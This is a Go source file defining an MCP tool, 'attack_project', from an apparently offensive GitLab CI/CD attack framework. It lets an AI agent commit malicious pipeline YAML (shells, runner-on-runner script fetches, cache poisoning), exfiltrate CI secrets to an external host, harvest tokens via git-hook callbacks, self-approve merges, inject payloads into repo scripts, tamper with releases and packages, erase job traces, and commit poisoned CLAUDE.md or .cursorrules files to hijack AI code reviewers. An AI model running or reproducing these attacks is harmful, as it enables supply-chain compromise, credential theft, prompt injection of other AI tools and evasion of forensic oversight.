package mcpserver

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/mr-pmillz/gogatoz/pkg/store"
)

const (
	statusError    = "error"
	payloadSecrets = "secrets"
)

// attackTool is the MCP tool definition for executing attack workflows.
var attackTool = &mcp.Tool{
	Name: "attack_project",
	Description: `Execute attack workflows against a GitLab project. Ten modes available:

  - commit_ci: Commit a malicious .gitlab-ci.yml with a chosen payload (ror-shell, pwn-request, ror, secrets, git-hook, cache-poison) or raw YAML.
  - secrets: Run a secrets exfiltration pipeline that dumps CI variables and environment.
  - discover_tags: Discover runner tags available to the project for targeting.
  - ai_inject: Commit a poisoned AI config file (CLAUDE.md, .cursorrules, etc.) to exploit AI code reviewers.
  - auto_merge: Create MR, self-approve, and merge to default branch (supply chain attack).
  - inject_script: Modify repo scripts called by CI for stealthy code execution (workflow hopping).
  - harvest: Install git hooks on runner and wait for callbacks to harvest tokens.
  - tamper_release: Modify GitLab release metadata and replace/add asset links.
  - tamper_package: Upload a malicious package to the Generic Packages registry.
  - cleanup_traces: Erase job traces and/or delete pipelines (anti-forensics).

Typical workflow: search_projects → enumerate_projects → attack_project.`,
}

// --- Input / Output types ------------------------------------------------

type attackInput struct {
	Target           string `json:"target"             jsonschema:"Project ID or path-with-namespace,required"`
	Mode             string `json:"mode"               jsonschema:"Attack mode: commit_ci, secrets, discover_tags, or ai_inject,required"`
	Payload          string `json:"payload"             jsonschema:"Payload type for commit_ci: ror-shell, pwn-request, ror, secrets"`
	Branch           string `json:"branch"              jsonschema:"Branch name (default: gogatoz-attack)"`
	Deconflict       string `json:"deconflict"          jsonschema:"Branch deconflict strategy: fail, suffix, force (default: suffix)"`
	Tags             string `json:"tags"                jsonschema:"Comma-separated runner tags"`
	Command          string `json:"command"             jsonschema:"Command for ror-shell payload (default: id; uname -a)"`
	CIYAML           string `json:"ci_yaml"             jsonschema:"Raw CI YAML (alternative to payload)"`
	CommitMessage    string `json:"commit_message"      jsonschema:"Custom commit message"`
	ScriptURL        string `json:"script_url"          jsonschema:"Script URL for runner-on-runner payload"`
	TargetOS         string `json:"target_os"           jsonschema:"Target OS for ror: linux, windows, macos"`
	TargetBranchExpr string `json:"target_branch_expr"  jsonschema:"Regex for pwn-request target branch filter"`
	ExfilMethod      string `json:"exfil_method"        jsonschema:"Exfil method: artifact, http, dns, icmp, git, cloud"`
	ExfilTarget      string `json:"exfil_target"        jsonschema:"URL/domain/IP for exfil transport"`
	Executor         string `json:"executor"            jsonschema:"Filter discovered tags by executor: docker, shell, kubernetes"`
	WaitForPipeline  *bool  `json:"wait_for_pipeline"   jsonschema:"Wait for pipeline creation (default: true)"`
	PipelineTimeout  string `json:"pipeline_timeout"    jsonschema:"Timeout for pipeline wait (default: 30s)"`
	AIConfigFile     string `json:"ai_config_file"      jsonschema:"AI config file to poison for ai_inject mode (default: CLAUDE.md)"`
	AIPrompt         string `json:"ai_prompt"            jsonschema:"Custom poison prompt content for ai_inject mode (uses default if empty)"`
	CreateMR         bool   `json:"create_mr"            jsonschema:"Create a merge request after committing (ai_inject and commit_ci modes)"`
	MRTitle          string `json:"mr_title"              jsonschema:"Merge request title"`
	MRDescription    string `json:"mr_description"        jsonschema:"Merge request description"`
	MRTargetBranch   string `json:"mr_target_branch"      jsonschema:"Target branch for the merge request"`
	// Auto-merge mode
	AutoMergeFile string `json:"auto_merge_file"      jsonschema:"File path to modify in auto_merge mode (default: .gitlab-ci.yml)"`
	// Script injection mode
	ScriptPath    string `json:"script_path"          jsonschema:"Path to script to inject into (auto-detected if empty)"`
	ScriptPayload string `json:"script_payload"       jsonschema:"Shell payload to inject into the target script"`
	ScriptPrepend bool   `json:"script_prepend"       jsonschema:"Prepend payload to script (default: true)"`
	// Harvest mode
	Webhook        string `json:"webhook"              jsonschema:"Callback URL for harvest mode (external URL reachable from runners)"`
	ListenAddr     string `json:"listen_addr"          jsonschema:"Listen address for harvest callback server (default :9443)"`
	HarvestTimeout string `json:"harvest_timeout"      jsonschema:"Harvest timeout duration (default 30m)"`
	HookType       string `json:"hook_type"            jsonschema:"Git hook type: post-checkout, post-merge, pre-push (default: post-checkout)"`
	// Cache poison payload
	CacheKey  string `json:"cache_key"            jsonschema:"Cache key to target for cache-poison payload"`
	CachePath string `json:"cache_path"           jsonschema:"Cache path to poison for cache-poison payload"`
	PoisonCmd string `json:"poison_cmd"           jsonschema:"Command to run for cache poisoning"`
	// Tamper release mode
	TagName     string `json:"tag_name"             jsonschema:"Release tag name for tamper_release"`
	ReleaseName string `json:"release_name"         jsonschema:"New release name for tamper_release"`
	ReleaseDesc string `json:"release_desc"         jsonschema:"New release description for tamper_release"`
	LinkName    string `json:"link_name"            jsonschema:"Release link name to replace"`
	LinkURL     string `json:"link_url"             jsonschema:"New URL for replaced release link"`
	AddLinkName string `json:"add_link_name"        jsonschema:"Name of new release link to add"`
	AddLinkURL  string `json:"add_link_url"         jsonschema:"URL of new release link to add"`
	// Tamper package mode
	PackageName    string `json:"package_name"        jsonschema:"Package name for tamper_package"`
	PackageVersion string `json:"package_version"     jsonschema:"Package version for tamper_package"`
	PackageFile    string `json:"package_file"        jsonschema:"Local file path for tamper_package"`
	// Cleanup traces mode
	PipelineIDStr  string `json:"pipeline_id"         jsonschema:"Pipeline ID to delete for cleanup_traces"`
	CleanupJobs    bool   `json:"cleanup_jobs"        jsonschema:"Erase all job traces for cleanup_traces mode"`
	CleanupJobsRef string `json:"cleanup_jobs_ref"    jsonschema:"Limit job trace erasure to pipelines on this ref"`
	CleanupJobsMax int    `json:"cleanup_jobs_max"    jsonschema:"Max recent pipelines to erase job traces from (default: 5)"`
}

type runnerOut struct {
	ID          int64    `json:"id"`
	Description string   `json:"description"`
	IsShared    bool     `json:"is_shared"`
	RunnerType  string   `json:"runner_type"`
	Tags        []string `json:"tags"`
}

type attackOutput struct {
	Mode            string      `json:"mode"`
	Target          string      `json:"target"`
	Status          string      `json:"status"` // success | error
	Error           string      `json:"error,omitempty"`
	PipelineURL     string      `json:"pipeline_url,omitempty"`
	PipelineID      int64       `json:"pipeline_id,omitempty"`
	Branch          string      `json:"branch,omitempty"`
	Payload         string      `json:"payload,omitempty"`
	Tags            []string    `json:"tags,omitempty"`
	Runners         []runnerOut `json:"runners,omitempty"`
	ConfigFile      string      `json:"config_file,omitempty"`
	MergeRequestURL string      `json:"merge_request_url,omitempty"`
	MergeRequestIID int64       `json:"merge_request_iid,omitempty"`
	Approved        bool        `json:"approved,omitempty"`
	Merged          bool        `json:"merged,omitempty"`
	Credentials     int         `json:"credentials_harvested,omitempty"`
	Callbacks       int         `json:"callbacks_received,omitempty"`
	PackageURL      string      `json:"package_url,omitempty"`
	LinksReplaced   int         `json:"links_replaced,omitempty"`
	LinksAdded      int         `json:"links_added,omitempty"`
	JobsErased      int         `json:"jobs_erased,omitempty"`
	ScriptPath      string      `json:"script_path,omitempty"`
	DurationMS      int64       `json:"duration_ms"`
}

// --- Handler -------------------------------------------------------------

func (s *Server) handleAttackProject(
	ctx context.Context,
	_ *mcp.CallToolRequest,
	input attackInput,
) (*mcp.CallToolResult, attackOutput, error) {
	target := strings.TrimSpace(input.Target)
	mode := strings.ToLower(strings.TrimSpace(input.Mode))
	if target == "" {
		return nil, attackOutput{}, fmt.Errorf("target is required")
	}
	if mode == "" {
		return nil, attackOutput{}, fmt.Errorf("mode is required (commit_ci, secrets, discover_tags, ai_inject, auto_merge, inject_script, harvest, tamper_release, tamper_package, cleanup_traces)")
	}

	start := time.Now()
	att := attack.NewAttacker(s.client, s.gitlabURL, "", "", 30*time.Second)
	if _, err := att.SetupUser(ctx); err != nil {
		return nil, attackOutput{}, fmt.Errorf("setup user: %w", err)
	}

	var out attackOutput
	out.Mode = mode
	out.Target = target
	out.Status = "success"

	switch mode {
	case "discover_tags":
		out = s.handleDiscoverTags(ctx, input, out)
	case "commit_ci":
		out = s.handleCommitCI(ctx, att, input, out)
	case payloadSecrets:
		out = s.handleSecrets(ctx, att, input, out)
	case "ai_inject":
		out = s.handleAIInject(ctx, att, input, out)
	case "auto_merge":
		out = s.handleAutoMerge(ctx, att, input, out)
	case "inject_script":
		out = s.handleInjectScript(ctx, att, input, out)
	case "harvest":
		out = s.handleHarvest(ctx, att, input, out)
	case "tamper_release":
		out = s.handleTamperRelease(ctx, input, out)
	case "tamper_package":
		out = s.handleTamperPackage(ctx, input, out)
	case "cleanup_traces":
		out = s.handleCleanupTraces(ctx, att, input, out)
	default:
		return nil, attackOutput{}, fmt.Errorf("unknown mode %q: use commit_ci, secrets, discover_tags, ai_inject, auto_merge, inject_script, harvest, tamper_release, tamper_package, or cleanup_traces", mode)
	}

	out.DurationMS = time.Since(start).Milliseconds()
	s.persistAttack(out)
	return nil, out, nil
}

// --- Mode handlers -------------------------------------------------------

func (s *Server) handleDiscoverTags(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	tags, runners, err := ror.DiscoverProjectRunnerTags(ctx, s.client, input.Target)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	if executor := strings.TrimSpace(input.Executor); executor != "" {
		tags = ror.FilterTagsByExecutor(tags, executor)
	}
	out.Tags = tags
	out.Runners = make([]runnerOut, len(runners))
	for i, r := range runners {
		out.Runners[i] = runnerOut{
			ID:          r.ID,
			Description: r.Description,
			IsShared:    r.IsShared,
			RunnerType:  r.RunnerType,
			Tags:        r.Tags,
		}
	}
	return out
}

func (s *Server) handleCommitCI(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	// Parse tags
	var tags []string
	if t := strings.TrimSpace(input.Tags); t != "" {
		for _, tag := range strings.Split(t, ",") {
			if v := strings.TrimSpace(tag); v != "" {
				tags = append(tags, v)
			}
		}
	}

	// Determine branch
	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}

	// Branch deconflict
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	// Render or use raw YAML
	var yamlContent string
	payload := strings.ToLower(strings.TrimSpace(input.Payload))
	out.Payload = payload

	if raw := strings.TrimSpace(input.CIYAML); raw != "" {
		yamlContent = raw
		if payload == "" {
			out.Payload = "custom"
		}
	} else {
		yamlContent, err = renderPayload(payload, input, tags)
		if err != nil {
			out.Status = statusError
			out.Error = err.Error()
			return out
		}
	}

	// Commit CI pipeline
	msg := strings.TrimSpace(input.CommitMessage)
	pipelineRefURL, err := att.CommitCIPipeline(ctx, input.Target, finalBranch, yamlContent, msg)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit ci: %s", err)
		return out
	}
	out.PipelineURL = pipelineRefURL
	out.Tags = tags

	// Wait for actual pipeline
	s.waitAndLogPipeline(ctx, input, &out, finalBranch)
	return out
}

func (s *Server) handleSecrets(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch
	out.Payload = payloadSecrets

	var tags []string
	if t := strings.TrimSpace(input.Tags); t != "" {
		for _, tag := range strings.Split(t, ",") {
			if v := strings.TrimSpace(tag); v != "" {
				tags = append(tags, v)
			}
		}
	}
	out.Tags = tags

	sa := attack.NewSecretsAttack(att)
	exfil := attack.ExfilOptions{
		Method: input.ExfilMethod,
		Target: input.ExfilTarget,
	}
	pipelineRefURL, _, err := sa.RunExfil(ctx, input.Target, finalBranch, "", tags, exfil)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("secrets exfil: %s", err)
		return out
	}
	out.PipelineURL = pipelineRefURL

	s.waitAndLogPipeline(ctx, input, &out, finalBranch)
	return out
}

func (s *Server) handleAIInject(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch
	out.Payload = "ai_inject"

	// Resolve prompt content
	prompt := strings.TrimSpace(input.AIPrompt)
	if prompt == "" {
		prompt = payloadgen.DefaultAIInjectionPrompt()
	}
	configFile := strings.TrimSpace(input.AIConfigFile)
	if configFile == "" {
		configFile = "CLAUDE.md"
	}
	out.ConfigFile = configFile

	if err := att.EnsureBranch(ctx, input.Target, finalBranch); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("ensure branch: %s", err)
		return out
	}
	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "Update " + configFile
	}
	if err := att.UpsertFile(ctx, input.Target, finalBranch, configFile, prompt, msg); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("upsert file: %s", err)
		return out
	}
	fmt.Fprintf(os.Stderr, "[attack] committed %s to branch %s\n", configFile, finalBranch)

	// Optionally create merge request
	if input.CreateMR {
		title := strings.TrimSpace(input.MRTitle)
		if title == "" {
			title = "Update " + configFile
		}
		mr, mrErr := att.CreateMergeRequest(ctx, input.Target, finalBranch,
			strings.TrimSpace(input.MRTargetBranch), title, strings.TrimSpace(input.MRDescription))
		if mrErr != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("create merge request: %s", mrErr)
			return out
		}
		out.MergeRequestURL = mr.WebURL
		out.MergeRequestIID = mr.IID
		fmt.Fprintf(os.Stderr, "[attack] merge request: %s\n", mr.WebURL)
	}

	return out
}

func (s *Server) handleAutoMerge(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	pers := attack.NewPersistence(att)

	filePath := strings.TrimSpace(input.AutoMergeFile)
	if filePath == "" {
		filePath = ".gitlab-ci.yml"
	}

	var content string
	if raw := strings.TrimSpace(input.CIYAML); raw != "" {
		content = raw
	} else if p := strings.TrimSpace(input.Payload); p != "" {
		tags := parseTags(input.Tags)
		var err error
		content, err = renderPayload(p, input, tags)
		if err != nil {
			out.Status = statusError
			out.Error = err.Error()
			return out
		}
	}
	if content == "" {
		out.Status = statusError
		out.Error = "provide content via ci_yaml or payload for auto_merge mode"
		return out
	}

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "chore: update configuration"
	}
	mrTitle := strings.TrimSpace(input.MRTitle)
	if mrTitle == "" {
		mrTitle = "Update project configuration"
	}

	result, mergeErr := pers.RunAutoMerge(ctx, input.Target,
		finalBranch, filePath, content, msg,
		mrTitle, input.MRDescription, input.MRTargetBranch)
	if mergeErr != nil && result == nil {
		out.Status = statusError
		out.Error = mergeErr.Error()
		return out
	}

	out.MergeRequestURL = result.MRURL
	out.MergeRequestIID = result.MRIID
	out.Approved = result.Approved
	out.Merged = result.Merged
	if result.ApproveErr != "" {
		out.Error = "approve: " + result.ApproveErr
	}
	if result.MergeErr != "" {
		if out.Error != "" {
			out.Error += "; "
		}
		out.Error += "merge: " + result.MergeErr
	}
	if !result.Merged && out.Error != "" {
		out.Status = statusError
	}
	return out
}

func (s *Server) handleInjectScript(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	payload := strings.TrimSpace(input.ScriptPayload)
	if payload == "" {
		out.Status = statusError
		out.Error = "script_payload is required for inject_script mode"
		return out
	}

	scriptPath := strings.TrimSpace(input.ScriptPath)
	if scriptPath == "" {
		// Auto-detect from CI config
		content, err := att.GetFileContent(ctx, input.Target, "", ".gitlab-ci.yml")
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("fetch .gitlab-ci.yml for script detection: %s", err)
			return out
		}
		doc, err := pipeline.Parse(strings.NewReader(content))
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("parse .gitlab-ci.yml: %s", err)
			return out
		}
		refs := scriptinject.ExtractScriptRefs(doc)
		if len(refs) == 0 {
			out.Status = statusError
			out.Error = "no external script references found in .gitlab-ci.yml; specify script_path"
			return out
		}
		scriptPath = refs[0].Path
		fmt.Fprintf(os.Stderr, "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
	}
	out.ScriptPath = scriptPath

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	if err := att.EnsureBranch(ctx, input.Target, finalBranch); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("ensure branch: %s", err)
		return out
	}

	original, err := att.GetFileContent(ctx, input.Target, finalBranch, scriptPath)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("fetch %s: %s", scriptPath, err)
		return out
	}

	var modified string
	if input.ScriptPrepend {
		modified = scriptinject.PrependPayload(original, payload)
	} else {
		modified = scriptinject.AppendPayload(original, payload)
	}

	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "Update " + scriptPath
	}
	if err := att.UpsertFile(ctx, input.Target, finalBranch, scriptPath, modified, msg); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit injected script: %s", err)
		return out
	}
	fmt.Fprintf(os.Stderr, "[attack] injected payload into %s on branch %s\n", scriptPath, finalBranch)
	return out
}

func (s *Server) handleHarvest(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	webhook := strings.TrimSpace(input.Webhook)
	if webhook == "" {
		out.Status = statusError
		out.Error = "webhook is required for harvest mode (external URL reachable from runners)"
		return out
	}

	// Build and commit git-hook payload
	tags := parseTags(input.Tags)
	hookYAML := payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
		Common: payloadgen.CommonOptions{
			Tags: tags,
		},
		CallbackURL: webhook,
		HookType:    strings.TrimSpace(input.HookType),
	})

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	pipelineURL, err := att.CommitCIPipeline(ctx, input.Target, branch, hookYAML, "Install CI hook via GoGatoZ")
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit git-hook payload: %s", err)
		return out
	}
	out.PipelineURL = pipelineURL
	out.Branch = branch
	out.Tags = tags
	fmt.Fprintf(os.Stderr, "[harvest] git-hook payload committed: %s\n", pipelineURL)

	// Parse timeout
	harvestTimeout := 30 * time.Minute
	if t := strings.TrimSpace(input.HarvestTimeout); t != "" {
		if d, err := time.ParseDuration(t); err == nil {
			harvestTimeout = d
		}
	}
	listenAddr := strings.TrimSpace(input.ListenAddr)
	if listenAddr == "" {
		listenAddr = pivot.DefaultListenAddr
	}

	h := pivot.NewHarvester(pivot.HarvestOptions{
		ListenAddr: listenAddr,
		GitLabURL:  s.gitlabURL,
		Timeout:    harvestTimeout,
		Progress: func(e pivot.HarvestEvent) {
			fmt.Fprintf(os.Stderr, "[harvest] %s: %s\n", e.Type, e.Message)
		},
	})

	result, err := h.Run(ctx)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("harvest: %s", err)
		return out
	}
	out.Callbacks = result.Callbacks
	out.Credentials = len(result.Credentials)
	return out
}

func (s *Server) handleTamperRelease(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	tagName := strings.TrimSpace(input.TagName)
	if tagName == "" {
		out.Status = statusError
		out.Error = "tag_name is required for tamper_release mode"
		return out
	}

	opts := tamper.TamperReleaseOptions{
		NewName:        strings.TrimSpace(input.ReleaseName),
		NewDescription: strings.TrimSpace(input.ReleaseDesc),
	}
	if ln := strings.TrimSpace(input.LinkName); ln != "" && strings.TrimSpace(input.LinkURL) != "" {
		opts.ReplaceLinks = map[string]string{ln: strings.TrimSpace(input.LinkURL)}
	}
	if an := strings.TrimSpace(input.AddLinkName); an != "" && strings.TrimSpace(input.AddLinkURL) != "" {
		opts.AddLinks = map[string]string{an: strings.TrimSpace(input.AddLinkURL)}
	}

	replaced, added, err := tamper.TamperRelease(ctx, s.client, input.Target, tagName, opts)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	out.LinksReplaced = replaced
	out.LinksAdded = added
	return out
}

func (s *Server) handleTamperPackage(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	pkgName := strings.TrimSpace(input.PackageName)
	pkgVer := strings.TrimSpace(input.PackageVersion)
	pkgFile := strings.TrimSpace(input.PackageFile)
	if pkgName == "" || pkgVer == "" || pkgFile == "" {
		out.Status = statusError
		out.Error = "package_name, package_version, and package_file are required for tamper_package"
		return out
	}

	f, err := os.Open(pkgFile) //nolint:gosec // file path provided by MCP caller
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("open package_file: %s", err)
		return out
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("stat package_file: %s", err)
		return out
	}

	result, err := tamper.PublishPackage(ctx, s.client, input.Target, pkgName, pkgVer, fi.Name(), f)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	out.PackageURL = result.URL
	return out
}

func (s *Server) handleCleanupTraces(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	// Delete a specific pipeline
	if pidStr := strings.TrimSpace(input.PipelineIDStr); pidStr != "" {
		pid, err := strconv.ParseInt(pidStr, 10, 64)
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("invalid pipeline_id: %s", err)
			return out
		}
		if err := att.DeletePipeline(ctx, input.Target, pid); err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("delete pipeline: %s", err)
			return out
		}
		fmt.Fprintf(os.Stderr, "[cleanup] deleted pipeline %d\n", pid)
		return out
	}

	// Erase job traces on recent pipelines
	if input.CleanupJobs {
		maxPipelines := input.CleanupJobsMax
		if maxPipelines <= 0 {
			maxPipelines = 5
		}
		erased, err := att.EraseRecentPipelines(ctx, input.Target,
			strings.TrimSpace(input.CleanupJobsRef), maxPipelines, false)
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("erase job traces: %s", err)
			return out
		}
		out.JobsErased = erased
		fmt.Fprintf(os.Stderr, "[cleanup] erased %d job traces\n", erased)
		return out
	}

	out.Status = statusError
	out.Error = "specify pipeline_id or set cleanup_jobs for cleanup_traces mode"
	return out
}

// parseTags splits a comma-separated tag string into a slice.
func parseTags(s string) []string {
	var tags []string
	if t := strings.TrimSpace(s); t != "" {
		for _, tag := range strings.Split(t, ",") {
			if v := strings.TrimSpace(tag); v != "" {
				tags = append(tags, v)
			}
		}
	}
	return tags
}

// --- Helpers -------------------------------------------------------------

// waitAndLogPipeline waits for pipeline creation and logs the URL to stderr.
func (s *Server) waitAndLogPipeline(ctx context.Context, input attackInput, out *attackOutput, branch string) {
	shouldWait := true
	if input.WaitForPipeline != nil {
		shouldWait = *input.WaitForPipeline
	}
	if !shouldWait {
		return
	}

	timeout := 30 * time.Second
	if t := strings.TrimSpace(input.PipelineTimeout); t != "" {
		if d, err := time.ParseDuration(t); err == nil {
			timeout = d
		}
	}

	pipelineID, err := attack.WaitForPipelineForRef(ctx, s.client, input.Target, branch, 0, 2*time.Second, timeout)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[attack] pipeline wait: %s\n", err)
		return
	}
	if pipelineID > 0 {
		out.PipelineID = pipelineID
		url := fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(s.gitlabURL, "/"), input.Target, pipelineID)
		out.PipelineURL = url
		fmt.Fprintf(os.Stderr, "[attack] pipeline: %s\n", url)
	}
}

// renderPayload generates CI YAML from the given payload type and options.
func renderPayload(payload string, input attackInput, tags []string) (string, error) {
	common := payloadgen.CommonOptions{Tags: tags}

	switch payload {
	case "ror-shell":
		return payloadgen.GenerateRORShellYAML(payloadgen.RORShellOptions{
			Common:  common,
			Command: input.Command,
		}), nil
	case "pwn-request":
		return payloadgen.GeneratePwnRequestYAML(payloadgen.PwnRequestOptions{
			Common:           common,
			TargetBranchExpr: input.TargetBranchExpr,
		}), nil
	case "ror", "runner-on-runner":
		return payloadgen.GenerateRunnerOnRunnerYAML(payloadgen.RunnerOnRunnerOptions{
			Common:    common,
			ScriptURL: input.ScriptURL,
			TargetOS:  input.TargetOS,
		}), nil
	case payloadSecrets, "secrets-exfil":
		return payloadgen.GenerateSecretsExfilYAML(payloadgen.SecretsExfilOptions{
			Common:      common,
			ExfilMethod: input.ExfilMethod,
			ExfilTarget: input.ExfilTarget,
		}), nil
	case "git-hook":
		return payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
			Common:      common,
			CallbackURL: input.Webhook,
			HookType:    input.HookType,
		}), nil
	case "cache-poison":
		return payloadgen.GenerateCachePoisonYAML(payloadgen.CachePoisonOptions{
			Common:    common,
			CacheKey:  input.CacheKey,
			PoisonCmd: input.PoisonCmd,
			CachePath: input.CachePath,
		}), nil
	case "":
		return "", fmt.Errorf("payload is required for commit_ci mode (ror-shell, pwn-request, ror, secrets, git-hook, cache-poison)")
	default:
		return "", fmt.Errorf("unknown payload %q: use ror-shell, pwn-request, ror, secrets, git-hook, or cache-poison", payload)
	}
}

// deconflictBranch picks a branch name using the requested strategy.
func deconflictBranch(ctx context.Context, att *attack.Attacker, projectID any, desired, strategy string) (string, error) {
	name := strings.TrimSpace(desired)
	if name == "" {
		name = attack.GogatozAttacks
	}
	st := strings.ToLower(strings.TrimSpace(strategy))
	if st == "" {
		st = "suffix"
	}
	exists, err := att.BranchExists(ctx, projectID, name)
	if err != nil {
		return "", err
	}
	switch st {
	case "fail":
		if exists {
			return "", fmt.Errorf("branch %s already exists", name)
		}
		return name, nil
	case "force":
		if exists {
			if err := att.DeleteBranch(ctx, projectID, name); err != nil {
				return "", fmt.Errorf("delete branch: %w", err)
			}
		}
		return name, nil
	case "suffix":
		if !exists {
			return name, nil
		}
		for i := 1; i <= 99; i++ {
			cand := fmt.Sprintf("%s-%d", name, i)
			e, err := att.BranchExists(ctx, projectID, cand)
			if err != nil {
				return "", err
			}
			if !e {
				return cand, nil
			}
		}
		return "", fmt.Errorf("could not find available suffix for %s", name)
	default:
		return "", fmt.Errorf("unknown deconflict strategy: %s", st)
	}
}

// persistAttack saves attack results to the store if available.
func (s *Server) persistAttack(out attackOutput) {
	if s.store == nil {
		return
	}
	now := time.Now()
	session := &store.ScanSession{
		GitLabURL:     s.gitlabURL,
		StartedAt:     now,
		FinishedAt:    &now,
		Status:        "completed",
		AttackTotal:   1,
		AttackSuccess: boolToInt(out.Status == "success"),
	}
	if err := s.store.CreateSession(session); err != nil {
		return
	}
	ar := store.AttackResult{
		GitLabProjectID:   0, // not always available from path input
		PathWithNamespace: out.Target,
		WebURL:            out.PipelineURL,
		Mode:              out.Mode,
		Payload:           out.Payload,
		Branch:            out.Branch,
		PipelineURL:       out.PipelineURL,
		PipelineID:        out.PipelineID,
		Tags:              strings.Join(out.Tags, ","),
		Status:            out.Status,
		Error:             out.Error,
		DurationMS:        out.DurationMS,
	}
	_ = s.store.SaveAttackResults(session.ID, []store.AttackResult{ar})
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
